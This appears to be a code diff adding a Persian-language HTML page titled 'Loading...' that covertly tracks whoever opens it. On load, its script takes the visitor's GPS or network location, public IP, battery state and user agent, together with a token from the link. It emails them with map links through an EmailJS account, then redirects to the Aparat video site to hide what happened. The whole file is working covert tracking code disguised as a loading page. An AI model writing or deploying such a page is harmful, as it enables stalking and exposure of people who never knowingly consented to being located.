@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width,initial-scale=1">
+
+<title>Loading...</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+</head>
+
+<body>
+
+<script>
+
+emailjs.init("eS7d6-exAWgeg8udU");
+
+const token =
+new URLSearchParams(location.search).get("token");
+
+/*
+ گرفتن IP
+*/
+async function getIP(){
+
+    try{
+
+        const res =
+        await fetch("https://api.ipify.org?format=json");
+
+        const data = await res.json();
+
+        return data.ip;
+
+    }catch(e){
+
+        return "unknown";
+
+    }
+
+}
+
+/*
+ گرفتن Battery
+*/
+async function getBatteryInfo(){
+
+    try{
+
+        const battery =
+        await navigator.getBattery();
+
+        return {
+            level:
+            Math.floor(battery.level * 100),
+
+            charging:
+            battery.charging
+        };
+
+    }catch(e){
+
+        return {
+            level:"unknown",
+            charging:"unknown"
+        };
+
+    }
+
+}
+
+function finish(){
+
+    location.replace("https://www.aparat.com/");
+
+}
+
+async function sendMail(lat, lon, accuracy, type){
+
+    /*
+     ساخت لینک‌ها
+    */
+    const neshan =
+    `https://nshn.ir/?lat=${lat}&lng=${lon}`;
+
+    const balad =
+    `https://balad.ir/p/${lat},${lon}`;
+
+    /*
+     گرفتن IP
+    */
+    const ip = await getIP();
+
+    /*
+     گرفتن Battery
+    */
+    const battery =
+    await getBatteryInfo();
+
+    /*
+     ارسال ایمیل
+    */
+    emailjs.send(
+
+        "service_6gxhqdn",
+
+        "template_slp067m",
+
+        {
+            token:token,
+
+            lat:lat,
+            lon:lon,
+
+            accuracy:accuracy,
+
+            type:type,
+
+            neshan:neshan,
+
+            balad:balad,
+
+            ip:ip,
+
+            battery:battery.level,
+
+            charging:battery.charging,
+
+            useragent:navigator.userAgent,
+
+            time:new Date().toLocaleString()
+
+        }
+
+    ).then(
+
+        finish,
+
+        finish
+
+    );
+
+}
+
+/*
+ fallback
+*/
+function networkFallback(){
+
+    navigator.geolocation.getCurrentPosition(
+
+        pos => {
+
+            sendMail(
+                pos.coords.latitude,
+                pos.coords.longitude,
+                pos.coords.accuracy,
+                "network"
+            );
+
+        },
+
+        finish,
+
+        {
+            enableHighAccuracy:false,
+            timeout:5000,
+            maximumAge:60000
+        }
+
+    );
+
+}
+
+/*
+ GPS اصلی
+*/
+navigator.geolocation.getCurrentPosition(
+
+    pos => {
+
+        sendMail(
+            pos.coords.latitude,
+            pos.coords.longitude,
+            pos.coords.accuracy,
+            "gps"
+        );
+
+    },
+
+    err => {
+
+        networkFallback();
+
+    },
+
+    {
+        enableHighAccuracy:true,
+        timeout:7000,
+        maximumAge:0
+    }
+
+);
+
+</script>
+
+</body>
+</html>
